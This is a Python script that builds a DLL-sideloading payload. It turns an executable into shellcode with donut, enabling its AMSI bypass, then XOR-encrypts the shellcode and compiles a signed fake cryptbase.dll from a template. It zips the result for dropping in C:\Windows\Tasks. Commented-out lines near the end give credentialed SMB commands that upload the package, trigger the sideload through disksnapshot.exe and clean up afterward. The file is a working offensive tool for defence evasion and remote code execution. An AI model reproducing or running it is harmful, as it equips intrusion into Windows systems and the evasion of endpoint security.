import os
import random
import string
import subprocess
import shutil
import argparse
import sys
import zipfile 
from textwrap import dedent 
from colorama import Fore,Style

def print_green(strings):
    try:
        print(Fore.GREEN + strings + Style.RESET_ALL)
    except Exception as e:
        print(Fore.GREEN + strings.encode('ascii',errors='ignore').decode('ascii') + Style.RESET_ALL)

def print_cyan(strings):
    try:
        print(Fore.CYAN + strings + Style.RESET_ALL)
    except Exception as e:
        print(Fore.CYAN + strings.encode('ascii',errors='ignore').decode('ascii') + Style.RESET_ALL)

def print_red(string):
    try:
        print(Fore.RED + string + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + string.encode('ascii',errors='ignore').decode('ascii') + Style.RESET_ALL)

def print_yellow(string):
    try:
        print(Fore.YELLOW + string + Style.RESET_ALL)
    except Exception as e:
        print(Fore.YELLOW + string.encode('ascii',errors='ignore').decode('ascii') + Style.RESET_ALL)

def xorencode(infile, key, outfile):
    # Generate key if one is not supplied
    if key == "" or key == None:
        letters = string.ascii_letters + string.digits
        key = ''.join(random.choice(letters) for i in range(49))
    # read input file as raw bytes    
    file = open(infile, 'rb')
    contents = file.read()
    file.close()
    # initialize encrypted byte array
    encoded = []
    for b in range(len(contents)):
        test = contents[b] ^ ord(key[b % len(key)])
        #hex_formated.append("{:02x}".format(test)) # store as each byte as hex string in array
        encoded.append(test)

    file = open(outfile, "wb")
    file.write(bytes(encoded))
    file.close()

def run_command(command):
    print_green(f"[*] Command: {command}\n")
    result = subprocess.run(["sh", "-c", command], capture_output=True, text=True)
    print_cyan(result.stdout.strip()) 

    if result.stderr:
        print_red(result.stderr.strip())
        exit(0)

def update_template(template_file, filepath, key):
    if os.path.basename(template_file).endswith(".cpp"):
        updated_template_file = template_file + ".tmp.cpp"
    else:
        updated_template_file = template_file + ".tmp.c" 

    shutil.copy(template_file, updated_template_file)

    with open(updated_template_file, 'r') as fd:
        file_content = fd.read()
        file_content = file_content.replace('{{FILENAME}}', filepath)
        file_content = file_content.replace('{{KEY}}', key)

    with open(updated_template_file, 'w') as fd:
        fd.write(file_content)

    return updated_template_file

def argparser():
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', '--input', type=str, help='Input PE/.NET Assembly filename', required=True)
    parser.add_argument('-o', '--output', type=str, help='Output shellcode filename', required=True)
    parser.add_argument('-k', '--key', type=str, help='XOR key in string format', required=True)
    parser.add_argument('-p', '--param', type=str, help='Parameters that the input file will run with. Example: -p="--fork --write \'c:\program files\hi\'\"', default='', required=False)
    parser.add_argument('-t', '--thread', type=bool, help='Enable donut -t thread execution', default=False, required=False)
    parser.add_argument('--template', dest='template', metavar='template', type=str, help='Template file to use. Default: template.cpp', default='template.cpp', required=False)

    if len(sys.argv) < 2: 
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    args = parser.parse_args()

    try:
        print(f"\n[DEBUG] Input: {args.input}")
        print(f"[DEBUG] Output: {args.output}")
        print(f"[DEBUG] Param: {args.param}")
        print(f"[DEBUG] Key: {args.key}")
        print(f"[DEBUG] Donut Thread flag: {args.thread}")
        print(f"[DEBUG] Template: {args.template}")
        print()
    except:
        print("Error parsing arguments")

    # Error check - INCLUDE ME LATER  
    # if not os.path.exists(args.input):
    #     print_red(f"[-] Input file {args.input} does not exist")
    #     exit(0) 

    return args

if __name__ == '__main__':
    args = argparser()
    input_file = args.input
    output_file = os.path.basename(args.output)
    key = args.key
    param = args.param

    workdir_name = "go-" + ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    destination_filepath = "C:\\\\Windows\\\\Tasks\\\\" + workdir_name + "\\\\"
    donut = "/opt/donut/donut"
    mingw_hwsyscall = "x86_64-w64-mingw32-g++"
    mingw_base = "x86_64-w64-mingw32-gcc"
    template_file = os.getcwd() + "/" + args.template 
    template_basename = os.path.basename(template_file) 

    # 1. donut -> shellcode 
    print_green("\n[+] 1. Donut -> Shellcode")
    shellcode_file = os.path.join(os.getcwd(), os.path.basename(input_file) + ".bin")
    """
    https://github.com/TheWover/donut#4-usage

    -x 2 = Exit process (kill dll-sideloading proc) 
    -a 3 = x86+amd64 
    -b 3 = AMSI/WLDP bypass, continue on fail 
    -t = thread execution
    """
    command = f"{donut} -i {input_file} -o {shellcode_file} -x 2 -a 3 -t -b 3 -p\"{param}\""
    run_command(command)
    print(f"\n[+] Donuted Shellcode: {shellcode_file}")

    # 2. Encrypt shellcode 
    print_green("\n[+] 2. Encrypt Shellcode")
    enc_shellcode_file = os.path.join(os.getcwd(), output_file)
    xorencode(shellcode_file, key, enc_shellcode_file)
    print(f"[+] Encrypted Shellcode file: {enc_shellcode_file}")

    # 3. Update template.c
    print_green("\n[+] 3. Update Template")
    filepath = destination_filepath + output_file
    updated_template_file = update_template(template_file, filepath, key)
    print(f"[+] Sideloaded DLL Source Code: {updated_template_file}\n")

    # 4. compile - Hardcoding with hwsyscalls.cpp BAD, but too lazy atm. 
    print_green("\n[+] 4. Compile")
    if template_basename.endswith(".cpp"):
        command = f"{mingw_hwsyscall} {updated_template_file} HWSyscalls.cpp cryptbase.def -static -s -w -shared -fpermissive -o uncryptbase.dll"
    else:
        command = f"{mingw_base} {updated_template_file} cryptbase.def -static -w -s -Wl,-subsystem,windows -shared -o uncryptbase.dll"
    run_command(command)

    # 5. Sign - hardcoding cryptbase.dll BAD.   
    print_green("\n[+] 5. Sign sideload DLL with osslsigncode")
    try:
        os.remove("cryptbase.dll")
    except:
        pass
    command = f"osslsigncode sign -pkcs12 cert_0.pfx -in uncryptbase.dll -out cryptbase.dll"
    run_command(command)

    # 6. Zip encrypted shellcode and cryptbase.dll
    print_green("\n[+] 6. Zip encrypted shellcode and cryptbase.dll")
    zip_filename = workdir_name + ".zip"   
    zip_pathname,_ = os.path.splitext(zip_filename)

    with zipfile.ZipFile(zip_filename, 'w') as zip:
        zip.write(os.path.basename(enc_shellcode_file))
        zip.write("cryptbase.dll")
    
    print_yellow(f"\n[+] Final Zip file: {zip_filename}")

    # 7. Print instructions
    print_green(f"\n[+] 7. Instructions")
    message = dedent(f"""
    Transfer, unzip, and sideload using dll_proxy_exec.py or nxc or whatever you want.""")
    print_green(f"{message}")

    # # 7-1. Execute with dll_proxy_exec.py 
    # print_green(f"\n[+] 7-1. Execute with dll_proxy_exec.py (Recommended)")
    # message = dedent(f"""
    # python3 dll_proxy_exec.py [domain]/user:pass@<ip/host> -z <zipfile> -e disksnapshot.exe -output""")

    # print_cyan(f"{message}")

    # # 7-2. Print cursed nxc command 
    # print_green(f"\n[+] 7-2. Or, execute with NXC (not recommended, deprecated)")
    # message = dedent(f"""
    # nxc smb <ip> -u <u> -p <p> --put-file {zip_filename} \\\\windows\\\\tasks\\\\{zip_filename} -x 'powershell.exe -c mkdir c:\\windows\\tasks\\{zip_pathname} ; Expand-Archive -Path c:\\windows\\tasks\\{zip_filename} -DestinationPath c:\\windows\\tasks\\{zip_pathname} ; rm c:\\windows\\tasks\\{zip_filename} ; cp c:\windows\system32\disksnapshot.exe c:\\windows\\tasks\\{zip_pathname}\\disksnapshot.exe ; c:\\windows\\tasks\\{zip_pathname}\\disksnapshot.exe'""")
    # print_cyan(f"{message}")

    # message = dedent(f"""
    # nxc smb <ip> -u <u> -p <p> -x 'rmdir /s /q c:\\windows\\tasks\\{zip_pathname}'""")
    # print_cyan(f"{message}")
